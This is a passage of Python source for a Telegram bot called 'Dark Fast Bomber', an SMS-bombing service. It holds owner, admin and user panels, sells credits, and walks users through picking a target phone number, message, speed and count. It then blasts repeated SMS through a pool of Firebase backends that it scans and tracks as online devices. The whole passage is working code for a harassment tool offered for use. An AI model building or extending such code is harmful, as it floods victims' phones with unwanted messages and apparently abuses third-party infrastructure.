        f"{em(EMOJI_CROWN, '👑')} sᴜᴘᴇʀ ᴀᴅᴍɪɴs  : <b>{len(owners)}/{d.get('settings', {}).get('max_owners', 6)}</b>\n"
        f"{em(EMOJI_SHIELD, '🛡')} ᴀᴅᴍɪɴs        : <b>{len(admins)}/{d.get('settings', {}).get('max_admins', 20)}</b>\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_BELL, '📢')} ғᴏʀᴄᴇ ᴊᴏɪɴ    : {fj_status}\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_TRASH, '🗑')} ᴀᴜᴛᴏ ᴄʟᴇᴀɴᴜᴘ : {auto_clean}\n"
        f"{em(EMOJI_PHONE, '📱')} ᴛᴏᴘ 5 ᴅʙs     :\n{fb_summary}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"╚══════════════════╝"
    )

def admin_panel_text(d: dict) -> str:
    users = d.get("users", {})
    stats = d.get("stats", {})
    banned = d.get("banned", [])
    mode = f"{em(EMOJI_CHECK, '🟢')} ғʀᴇᴇ" if d.get("free_mode") else f"{em(EMOJI_CROSS, '🔴')} ᴀᴘᴘʀᴏᴠᴀʟ"
    active_sessions = len([s for s in USER_SESSIONS.values() if s.task and not s.task.done()])
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_SHIELD, '🛡')} <b>{sc('admin panel')}</b> — {_VERSION}\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"╔══════════════════╗\n"
        f"{em(EMOJI_STAR, '👥')} ᴛᴏᴛᴀʟ ᴜsᴇʀs   : <b>{len(users)}</b>\n"
        f"{em(EMOJI_CROSS, '🚫')} ʙᴀɴɴᴇᴅ        : <b>{len(banned)}</b>\n"
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ    : <b>{stats.get('total_sent', 0)}</b>\n"
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ  : <b>{stats.get('total_failed', 0)}</b>\n"
        f"{em(EMOJI_ROCKET, '🚀')} ᴀᴄᴛɪᴠᴇ sᴇɴᴅs  : <b>{active_sessions}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ғɪʀᴇʙᴀsᴇ ᴅʙs  : <b>{len(d.get('firebases', []))}</b>\n"
        f"{em(EMOJI_LOCK, '🔒')} ᴘʀᴏᴛᴇᴄᴛᴇᴅ     : <b>{len(PROTECTED_NUMBERS)}</b>\n"
        f"{em(EMOJI_GIFT, '🔓')} ᴀᴄᴄᴇss ᴍᴏᴅᴇ   : {mode}\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ       : {scan_info}\n"
        f"╚══════════════════╝"
    )

def user_home_text(uid: int, d: dict) -> str:
    udata = d["users"].get(str(uid), {})
    fbs = d.get("firebases", [])
    credits = udata.get("credits", 0)
    scan_info = get_scan_status()
    return (
        f"{em(EMOJI_DIAMOND, '💎')} <b>ᴅᴀʀᴋ ꜰᴀꜱᴛ ʙᴏᴍʙᴇʀ {_VERSION}</b>\n"
        f"<b>Owner:</b> {OWNER_NAME}\n\n"
        f"╔══════════════════╗\n"
        f"{em(EMOJI_STAR, '👤')} ʀᴏʟᴇ    : {role_tag(uid, d)}\n"
        f"{em(EMOJI_MONEY, '💰')} ᴄʀᴇᴅɪᴛs : <b>{credits}</b>\n"
        f"{em(EMOJI_STAR, '🔢')} ᴜsᴇs    : <b>{udata.get('uses', 0)}</b>\n"
        f"{em(EMOJI_FIRE, '🔥')} ᴀᴘɪs    : <b>{len(fbs)}</b>\n"
        f"{em(EMOJI_GEAR, '🔄')} sᴄᴀɴɴᴇʀ : {scan_info}\n"
        f"╚══════════════════╝\n\n"
        f"ᴛᴀᴘ <b>{sc('send sms')}</b> ᴛᴏ sᴛᴀʀᴛ {em(EMOJI_ROCKET, '🚀')}"
    )

# ========== KEYBOARDS ==========
def owner_kb(d: dict) -> InlineKeyboardMarkup:
    mode_btn = (f"🔴 {sc('disable free mode')}", "owner:free:off") if d.get("free_mode") else (f"🟢 {sc('enable free mode')}", "owner:free:on")
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "owner:send", EMOJI_ROCKET, "📤"), btn("ᴍᴀɴᴀɢᴇ ғɪʀᴇʙᴀsᴇ", "owner:fb:menu:0", EMOJI_FIRE, "🔥")],
        [btn("ᴍᴀɴᴀɢᴇ sᴜᴘᴇʀ ᴀᴅᴍɪɴs", "owner:owners:menu", EMOJI_CROWN, "👑"), btn("ᴍᴀɴᴀɢᴇ ᴀᴅᴍɪɴs", "owner:admins:menu", EMOJI_SHIELD, "🛡")],
        [btn("ᴠɪᴇᴡ ᴜsᴇʀs", "owner:users:list", EMOJI_STAR, "👥"), btn("ʙᴀɴ ᴜsᴇʀ", "owner:ban", EMOJI_CROSS, "🚫")],
        [btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "owner:unban:menu", EMOJI_CHECK, "✅"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "owner:broadcast", EMOJI_BELL, "📢")],
        [btn("ᴀᴘɪ sᴛᴀᴛs", "owner:stats", EMOJI_STAR, "📊"), btn("ᴀᴄᴛɪᴠɪᴛɪ ʟᴏɢ", "owner:activity", EMOJI_GEAR, "📜")],
        [btn("ᴘʀɪᴄɪɴɢ ᴘʟᴀɴs", "owner:pricing:menu", EMOJI_MONEY, "💳"), btn("ʀᴇᴅᴇᴇᴍ ᴄᴏᴅᴇs", "owner:redeem:menu", EMOJI_GIFT, "🎁")],
        [btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs", "owner:credits:add", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴄʀᴇᴅɪᴛs", "owner:credits:deduct", EMOJI_CROSS, "💰")],
        [btn("ᴀᴅᴅ ᴄʀᴇᴅɪᴛs ᴀʟʟ", "owner:add_all_credits", EMOJI_MONEY, "💰"), btn("ᴅᴇᴅᴜᴄᴛ ᴀʟʟ", "owner:deduct_all_credits", EMOJI_CROSS, "💰")],
        [btn("ғᴏʀᴄᴇ ᴊᴏɪɴ", "owner:fj:menu", EMOJI_BELL, "🔗"), btn("sᴇᴛᴛɪɴɢs", "owner:settings", EMOJI_GEAR, "⚙️")],
        [btn("sᴍs ʜɪsᴛᴏʀʏ", "owner:sms_history", EMOJI_STAR, "📋"), btn("ᴇxᴘᴏʀᴛ sᴄʀɪᴘᴛ", "owner:export_script", EMOJI_GEAR, "📤")],
        [btn("ᴘʀᴏᴛᴇᴄᴛ ɴᴜᴍʙᴇʀ", "owner:protect", EMOJI_LOCK, "🔒"), btn("ᴘʀᴏᴛᴇᴄᴛᴇᴅ ʟɪsᴛ", "owner:protected_list", EMOJI_LOCK, "🔐")],
        [btn("ᴛʀᴀᴄᴋ ɴᴜᴍʙᴇʀ", "owner:track", EMOJI_STAR, "📊")],
        [InlineKeyboardButton(text=mode_btn[0], callback_data=mode_btn[1])],
        [btn("ʀᴇғʀᴇsʜ", "owner:refresh", EMOJI_GEAR, "🔄")],
    ])

def admin_kb(d: dict) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "admin:send", EMOJI_ROCKET, "📤"), btn("ᴠɪᴇᴡ ᴜsᴇʀs", "admin:users:list", EMOJI_STAR, "👥")],
        [btn("ᴀᴘɪ sᴛᴀᴛs", "admin:stats", EMOJI_STAR, "📊"), btn("ʙᴀɴ ᴜsᴇʀ", "admin:ban", EMOJI_CROSS, "🚫")],
        [btn("ᴜɴʙᴀɴ ᴜsᴇʀ", "admin:unban:menu", EMOJI_CHECK, "✅"), btn("ʙʀᴏᴀᴅᴄᴀsᴛ", "admin:broadcast", EMOJI_BELL, "📢")],
        [btn("ʀᴇғʀᴇsʜ", "admin:refresh", EMOJI_GEAR, "🔄")],
    ])

def user_kb() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(inline_keyboard=[
        [btn("sᴇɴᴅ sᴍs", "user:send", EMOJI_ROCKET, "📤")],
        [btn("ᴄʀᴇᴅɪᴛs", "user:credits", EMOJI_MONEY, "💳"), btn("ʀᴇᴅᴇᴇᴍ", "user:redeem", EMOJI_GIFT, "🎁")],
        [btn("ʀᴇғᴇʀ", "user:refer", EMOJI_STAR, "👥"), btn("sᴛᴀᴛs", "user:stats", EMOJI_STAR, "📊")],
        [btn("ᴍʏ sᴍs ʜɪsᴛᴏʀʏ", "user:sms_history", EMOJI_STAR, "📜"), btn("ʙᴜʏ ᴄʀᴇᴅɪᴛs", "user:pricing", EMOJI_MONEY, "💰")],
        [btn("ᴛʀᴀɴsғᴇʀ ᴄʀᴇᴅɪᴛs", "user:transfer", EMOJI_MONEY, "💸"), btn("ɪɴғᴏ", "user:info", EMOJI_GEAR, "ℹ️")],
    ])

def fb_menu_kb(d: dict, page: int = 0) -> InlineKeyboardMarkup:
    fbs = d.get("firebases", [])
    per_page = 8
    total_pages = max(1, (len(fbs) + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    start_idx = page * per_page
    current_fbs = fbs[start_idx:start_idx + per_page]

    rows = [
        [btn("ᴀᴅᴅ ғɪʀᴇʙᴀsᴇ", "owner:fb:add", EMOJI_CHECK, "➕"),
         btn("📁 ᴀᴅᴅ ᴠɪᴀ ᴛxᴛ", "owner:fb:add_file", EMOJI_CHECK, "📄")],
        [btn("📥 ᴏɴʟɪɴᴇ ᴛxᴛ ᴇxᴘᴏʀᴛ", "owner:fb:export_online", EMOJI_CHECK, "📥"),
         btn("🗑 ᴄʟᴇᴀɴ ᴏғғʟɪɴᴇ", "owner:fb:clean_now", EMOJI_TRASH, "🗑")],
        [btn("⚠️ ᴅᴇʟᴇᴛᴇ ᴀʟʟ ғɪʀᴇʙᴀsᴇs", "owner:fb:delete_all", EMOJI_TRASH, "⚠️")],
    ]

    for fb in current_fbs:
        label = fb.get("label", fb["url"].replace("https://", ""))
        if len(label) > 16: label = label[:14] + ".."
        online_count = FB_DEVICE_COUNTS.get(fb["id"], {}).get("online", 0)
        fails = FB_FAIL_COUNT.get(fb["id"], 0)
        status = "🟢" if online_count > 0 else ("🟡" if fails < _FB_AUTO_DELETE_THRESHOLD else "🔴")
        rows.append([
            btn(f"{status} {label} ({online_count})", "noop", EMOJI_FIRE, "🔥"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:fb:del:{fb['id']}:{page}", EMOJI_CROSS, "🗑")
        ])

    nav_row = []
    if page > 0: nav_row.append(btn("◀️ ᴘʀᴇᴠ", f"owner:fb:menu:{page-1}", EMOJI_GEAR, "◀️"))
    nav_row.append(btn(f"{page+1}/{total_pages}", "noop", EMOJI_GEAR, "📄"))
    if page < total_pages - 1: nav_row.append(btn("ɴᴇxᴛ ▶️", f"owner:fb:menu:{page+1}", EMOJI_GEAR, "▶️"))
    if nav_row: rows.append(nav_row)
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def owners_menu_kb(d: dict) -> InlineKeyboardMarkup:
    owners = d.get("owners", [])
    meta = d.get("role_meta", {})
    max_owners = d.get("settings", {}).get("max_owners", 6)
    rows = []
    if len(owners) < max_owners:
        rows.append([btn("ᴀᴅᴅ sᴜᴘᴇʀ ᴀᴅᴍɪɴ", "owner:owners:add", EMOJI_CHECK, "➕")])
    for oid in owners:
        m = meta.get(str(oid), {})
        if oid == MAIN_OWNER:
            rows.append([InlineKeyboardButton(text=f"👑 {oid} (MAIN)", callback_data="noop")])
        else:
            ab = m.get("added_by", "")
            label = f"🔱 {oid}" + (f" ◄ {ab}" if ab else "")
            rows.append([
                InlineKeyboardButton(text=label[:35], callback_data="noop"),
                btn("ʀᴇᴍᴏᴠᴇ", f"owner:owners:del:{oid}", EMOJI_CROSS, "🗑")
            ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def admins_menu_kb(d: dict) -> InlineKeyboardMarkup:
    admins = d.get("admins", [])
    meta = d.get("role_meta", {})
    rows = [
        [btn("ᴀᴅᴅ ᴀᴅᴍɪɴ", "owner:admins:add", EMOJI_CHECK, "➕"),
         btn("📁 ʙᴜʟᴋ ᴀᴅᴅ", "owner:admins:add_bulk", EMOJI_CHECK, "📄")]
    ]
    for aid in admins:
        m = meta.get(str(aid), {})
        ab = m.get("added_by", "")
        label = f"🛡 {aid}" + (f" ◄ {ab}" if ab else "")
        rows.append([
            InlineKeyboardButton(text=label[:35], callback_data="noop"),
            btn("ʀᴇᴍᴏᴠᴇ", f"owner:admins:del:{aid}", EMOJI_CROSS, "🗑")
        ])
    rows.append([btn("ʙᴀᴄᴋ", "owner:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def unban_menu_kb(d: dict, prefix: str) -> InlineKeyboardMarkup:
    banned = d.get("banned", [])
    rows = []
    for bid in banned:
        rows.append([btn(f"{bid}", f"{prefix}:unban:do:{bid}", EMOJI_CHECK, "🔓")])
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return InlineKeyboardMarkup(inline_keyboard=rows)

def users_list_kb(d: dict, prefix: str, page: int = 0) -> tuple:
    users = d.get("users", {})
    items = list(users.items())
    per = 10
    start = page * per
    chunk = items[start:start + per]
    approved = d.get("approved", [])
    banned = d.get("banned", [])
    lines = [f"{em(EMOJI_STAR, '👥')} <b>{sc('users')} ({len(items)} ᴛᴏᴛᴀʟ)</b>\n"]
    for uid_str, udata in chunk:
        uid = int(uid_str)
        name = udata.get("name", "Unknown")
        uses = udata.get("uses", 0)
        credits = udata.get("credits", 0)
        if uid in banned: status = em(EMOJI_CROSS, "🚫")
        elif uid in approved: status = em(EMOJI_CHECK, "✅")
        elif is_owner(uid, d): status = em(EMOJI_CROWN, "👑")
        elif uid in d["admins"]: status = em(EMOJI_SHIELD, "🛡")
        else: status = em(EMOJI_STAR, "👤")
        lines.append(f"{status} <code>{uid}</code> — {name[:18]} | 💰{credits} | 📤{uses}")
    text = "\n".join(lines)
    rows = []
    nav = []
    if page > 0: nav.append(btn("◀️ ᴘʀᴇᴠ", f"{prefix}:users:pg:{page-1}", EMOJI_GEAR, "◀️"))
    if start + per < len(items): nav.append(btn("ɴᴇxᴛ ▶️", f"{prefix}:users:pg:{page+1}", EMOJI_GEAR, "▶️"))
    if nav: rows.append(nav)
    rows.append([btn("ʙᴀᴄᴋ", f"{prefix}:home", EMOJI_GEAR, "🔙")])
    return text, InlineKeyboardMarkup(inline_keyboard=rows)

def api_stats_text(d: dict) -> str:
    stats = d.get("stats", {})
    api_use = stats.get("api_usage", {})
    fbs = {fb["id"]: fb for fb in d.get("firebases", [])}
    lines = [
        f"{em(EMOJI_STAR, '📊')} <b>{sc('api stats')}</b>\n",
        f"{em(EMOJI_CHECK, '📤')} ᴛᴏᴛᴀʟ sᴇɴᴛ   : <b>{stats.get('total_sent', 0)}</b>",
        f"{em(EMOJI_CROSS, '❌')} ᴛᴏᴛᴀʟ ғᴀɪʟᴇᴅ : <b>{stats.get('total_failed', 0)}</b>\n",
        "━━━━━━━━━━━━━━━━━━",
        f"<b>{sc('per firebase:')}</b>"]
    if not api_use:
        lines.append(f"  {em(EMOJI_WARNING, '😴')} ɴᴏ ᴜsᴀɢᴇ ʏᴇᴛ.")
    for fb_id, fb_stats in list(api_use.items())[:10]:
        fb = fbs.get(fb_id)
        label = fb.get("label", fb_id[:20]) if fb else fb_id[:20]
        label = label.replace("<", "&lt;").replace(">", "&gt;").replace("&", "&amp;")
        lines.append(f"{em(EMOJI_FIRE, '🔥')} {label}\n   ✅ {fb_stats.get('sent', 0)} sᴇɴᴛ  ❌ {fb_stats.get('failed', 0)} ғᴀɪʟᴇᴅ")
    if len(api_use) > 10: lines.append(f"<i>+{len(api_use)-10} more</i>")
    return "\n".join(lines)

R = Router()

# ========== VALIDATION ==========
def is_valid_firebase_url(url: str) -> bool:
    if not url.startswith("https://"): return False
    return url.endswith(".firebaseio.com") or "firebasedatabase.app" in url

# ================= START =================
@R.message(CommandStart(deep_link=True))
async def cmd_start_deep(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        save(d)
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"))
    args = msg.text.split()
    code = args[1] if len(args) > 1 else ""
    if code.startswith("REF"):
        if not d["users"].get(str(uid), {}).get("referred_by"):
            success, msg_text, referrer = process_referral(uid, code, d)
            if success and referrer:
                try:
                    ref_name = d["users"].get(str(uid), {}).get("name", "Someone")
                    await msg.bot.send_message(referrer,
                        f"{em(EMOJI_GIFT, '🎉')} <b>{ref_name}</b> ne aapka referral use kiya!\n"
                        f"{em(EMOJI_MONEY, '💰')} +{d['settings']['ref_credits']} credits mile.", parse_mode="HTML")
                except: pass
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Aapko ban kiya gaya hai.</b>", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi hai!</b>\n\nOwner: {OWNER_NAME}", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.message(Command("start"))
async def cmd_start(msg: Message, state: FSMContext):
    await state.clear()
    uid = msg.from_user.id
    asyncio.create_task(send_fire_effect_private(msg.bot, msg.chat.id))
    name = msg.from_user.full_name or "User"
    username = f"@{msg.from_user.username}" if msg.from_user.username else "No Username"
    d = load()
    is_new = reg_user(uid, name, d)
    if is_new:
        save(d)
        asyncio.create_task(send_channel_log(msg.bot,
            f"🆕 <b>NEW USER</b>\n\n👤 {name}\n🆔 <code>{uid}</code>\n🌐 {username}\n📅 {fmt_time(int(time.time()))}"))
    joined, missing = await user_joined_all(msg.bot, uid, d)
    if not joined:
        await msg.answer(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
    if is_owner(uid, d):
        await msg.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML"); return
    if is_admin(uid, d):
        await msg.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML"); return
    if is_banned(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '🚫')} <b>Banned.</b>", parse_mode="HTML"); return
    if not can_use(uid, d):
        await msg.answer(f"{em(EMOJI_CROSS, '⛔')} <b>Access nahi!</b>", parse_mode="HTML"); return
    await msg.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "fj:check")
async def fj_check(cq: CallbackQuery, state: FSMContext):
    uid = cq.from_user.id
    d = load()
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("❌ Abhi bhi join nahi!", show_alert=True)
        try: await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True)
        except: pass
        return
    await cq.answer("✅ Verified!", show_alert=True)
    if is_owner(uid, d): await cq.message.answer(owner_panel_text(d), reply_markup=owner_kb(d), parse_mode="HTML")
    elif is_admin(uid, d): await cq.message.answer(admin_panel_text(d), reply_markup=admin_kb(d), parse_mode="HTML")
    else: await cq.message.answer(user_home_text(uid, d), reply_markup=user_kb(), parse_mode="HTML")

@R.callback_query(F.data == "noop")
async def noop(cq: CallbackQuery):
    await cq.answer()

# ================= USER SMS FLOW =================
@R.callback_query(F.data == "user:send")
async def user_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    joined, missing = await user_joined_all(cq.bot, uid, d)
    if not joined:
        await cq.answer("⛔ Force Join!", show_alert=True)
        await cq.message.edit_text(force_join_text(missing), reply_markup=force_join_kb(missing), parse_mode="HTML", disable_web_page_preview=True); return
    if not can_use(uid, d):
        await cq.answer("🚫 Access denied!", show_alert=True); return
    await state.set_state(S.send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')} — {sc('number')}</b>\n\nNumber daalo:",
        reply_markup=kb([(sc('cancel'), "user:home")]), parse_mode="HTML")

@R.message(S.send_number, F.text)
async def user_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid. Dobara bhejo:", parse_mode="HTML"); return
    if number in PROTECTED_NUMBERS:
        await msg.answer(f"{em(EMOJI_LOCK, '🔒')} <b>Ye number protected hai!</b>", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.send_message)
    await msg.answer(f"✅ Number: <code>{mask_number(number)}</code>\n\n{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')}</b>\n\nMessage type karo:",
        reply_markup=kb([(sc('cancel'), "user:cancel")]), parse_mode="HTML")

@R.message(S.send_number)
async def user_got_number_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text number bhejo.", parse_mode="HTML")

@R.message(S.send_message, F.text)
async def user_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.send_speed)
    await msg.answer(f"✅ Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')} — {sc('speed')}</b>",
        reply_markup=speed_kb("user"), parse_mode="HTML")

@R.message(S.send_message)
async def user_got_message_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

@R.callback_query(F.data.in_({"user:speed:fast", "user:speed:medium", "user:speed:slow"}))
async def user_speed_selected(cq: CallbackQuery, state: FSMContext):
    d = load()
    uid = cq.from_user.id
    speed_map = {"user:speed:fast": SPEED_FAST, "user:speed:medium": SPEED_MEDIUM, "user:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.send_count)
    count = len(get_cached_devices())
    credit_info = ""
    if not is_admin(uid, d):
        credit_info = f"\n{em(EMOJI_MONEY, '💰')} Credits: <b>{get_user_credits(uid, d)}</b>"
    await cq.message.edit_text(
        f"{speed_label} <b>selected!</b>\n\n{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')} — {sc('count')}</b>\n\n"
        f"{em(EMOJI_FIRE, '🔥')} APIs: <b>{count}</b>{credit_info}\n\nKitne SMS bhejne hain?",
        reply_markup=kb([(sc('cancel'), "user:cancel")]), parse_mode="HTML")

@R.message(S.send_count, F.text)
async def user_got_count(msg: Message, state: FSMContext):
    d = load()
    uid = msg.from_user.id
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    if not is_admin(uid, d):
        current_credits = get_user_credits(uid, d)
        if current_credits <= 0:
            await msg.answer(f"{em(EMOJI_CROSS, '❌')} <b>Credits nahi hain!</b>", reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML"); return
        if count > current_credits:
            await msg.answer(f"{em(EMOJI_WARNING, '⚠️')} Sirf {current_credits} credits hain!", parse_mode="HTML")
            count = current_credits
    devices = get_cached_devices()
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(sc('home'), "user:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, uid, number, message_text, count, devices, send_speed)

@R.message(S.send_count)
async def user_got_count_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo.", parse_mode="HTML")

# ================= OWNER SMS FLOW =================
@R.callback_query(F.data == "owner:send")
async def owner_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_owner(cq.from_user.id, d):
        await cq.answer("🚫 Owner only!", show_alert=True); return
    await state.set_state(S.owner_send_number)
    await cq.message.edit_text(
        f"{em(EMOJI_CROWN, '👑')} <b>Owner SMS</b>\n\n{em(EMOJI_PHONE, '📞')} <b>{sc('step 1/4')}</b>\n\nNumber daalo:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_number, F.text)
async def owner_got_number(msg: Message, state: FSMContext):
    number = msg.text.strip()
    if not number.replace("+", "").replace(" ", "").isdigit() or len(number) < 7:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Invalid.", parse_mode="HTML"); return
    await state.update_data(number=number)
    await state.set_state(S.owner_send_message)
    await msg.answer(f"✅ <code>{number}</code>\n\n{em(EMOJI_STAR, '💬')} <b>{sc('step 2/4')}</b>\n\nMessage:",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_number)
async def owner_got_number_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo.", parse_mode="HTML")

@R.message(S.owner_send_message, F.text)
async def owner_got_message(msg: Message, state: FSMContext):
    await state.update_data(message=msg.text.strip())
    await state.set_state(S.owner_send_speed)
    await msg.answer(f"✅ Saved!\n\n{em(EMOJI_ROCKET, '⚡')} <b>{sc('step 3/4')}</b>",
        reply_markup=speed_kb("owner"), parse_mode="HTML")

@R.message(S.owner_send_message)
async def owner_got_message_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf text bhejo.", parse_mode="HTML")

@R.callback_query(F.data.in_({"owner:speed:fast", "owner:speed:medium", "owner:speed:slow"}))
async def owner_speed_selected(cq: CallbackQuery, state: FSMContext):
    speed_map = {"owner:speed:fast": SPEED_FAST, "owner:speed:medium": SPEED_MEDIUM, "owner:speed:slow": SPEED_SLOW}
    selected_speed = speed_map.get(cq.data, SPEED_MEDIUM)
    speed_label = "🚀 FAST" if selected_speed == SPEED_FAST else "⚡ MEDIUM" if selected_speed == SPEED_MEDIUM else "🐢 SLOW"
    await state.update_data(send_speed=selected_speed)
    await state.set_state(S.owner_send_count)
    count = len(get_cached_devices())
    await cq.message.edit_text(f"{speed_label}!\n\n{em(EMOJI_STAR, '📊')} <b>{sc('step 4/4')}</b>\n\nAPIs: <b>{count}</b>\n\nKitne bhejne hain?",
        reply_markup=kb([(sc('cancel'), "owner:home")]), parse_mode="HTML")

@R.message(S.owner_send_count, F.text)
async def owner_got_count(msg: Message, state: FSMContext):
    fsmd = await state.get_data()
    try:
        count = int(msg.text.strip())
        if count < 1: raise ValueError
    except:
        await msg.answer(f"{em(EMOJI_CROSS, '❌')} Valid number bhejo:", parse_mode="HTML"); return
    await state.clear()
    number = fsmd.get("number", "")
    message_text = fsmd.get("message", "")
    send_speed = fsmd.get("send_speed", SPEED_DEFAULT)
    devices = get_cached_devices()
    if not devices:
        await msg.answer(f"{em(EMOJI_WARNING, '😴')} Koi API online nahi!", reply_markup=kb([(sc('owner panel'), "owner:home")]), parse_mode="HTML"); return
    await run_sms_blast_with_progress(msg.bot, msg, msg.from_user.id, number, message_text, count, devices, send_speed)

@R.message(S.owner_send_count)
async def owner_got_count_invalid(msg: Message):
    await msg.answer(f"{em(EMOJI_CROSS, '❌')} Sirf number bhejo.", parse_mode="HTML")

# ================= ADMIN SMS FLOW =================
@R.callback_query(F.data == "admin:send")
async def admin_send_start(cq: CallbackQuery, state: FSMContext):
    d = load()
    if not is_admin(cq.from_user.id, d):
        await cq.answer("🚫 Admin only!", show_alert=True); return
    await state.set_state(S.admin_send_number)
    await cq.message.edit_text(
